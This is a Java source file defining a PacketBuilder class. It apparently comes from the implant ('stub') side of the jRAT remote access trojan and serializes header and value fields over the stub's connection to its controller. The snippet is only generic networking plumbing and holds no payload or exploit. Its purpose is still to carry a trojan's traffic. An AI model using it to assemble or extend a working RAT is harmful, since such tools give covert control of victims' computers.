package pro.jrat.stub.packets.incoming;

import java.util.ArrayList;
import java.util.List;

import pro.jrat.common.exceptions.PacketAlreadySentException;
import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.OutgoingHeader;


public class PacketBuilder {

	private final short header;
	private List<Object> list;
	private boolean sent;

	public PacketBuilder(OutgoingHeader header) {
		this.header = header.getHeader();
	}

	public PacketBuilder(OutgoingHeader header, Object extra) {
		this(header, new Object[] { extra });
	}

	public PacketBuilder(OutgoingHeader header, Object[] extra) {
		short h = header.getHeader();

		for (Object obj : extra) {
			add(obj);
		}

		this.header = h;
	}

	public void add(Object obj) {
		if (list == null) {
			list = new ArrayList<Object>();
		}

		list.add(obj);
	}

	public synchronized void write() {
		try {
			if (sent) {
				throw new PacketAlreadySentException();
			}

			Connection.writeByte(header);

			for (int i = 0; list != null && i < list.size(); i++) {
				Object obj = list.get(i);
				
				if (obj instanceof Integer) {
					Connection.writeInt((Integer) obj);
				} else if (obj instanceof Long) {
					Connection.writeLong((Long) obj);
				} else if (obj instanceof Boolean) {
					Connection.writeBoolean((Boolean) obj);
				} else if (obj instanceof Short) {
					Connection.writeShort((Short) obj);
				} else {
					Connection.writeLine(obj.toString());
				}
				
			}

			sent = true;

			if (list != null) {
				list.clear();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}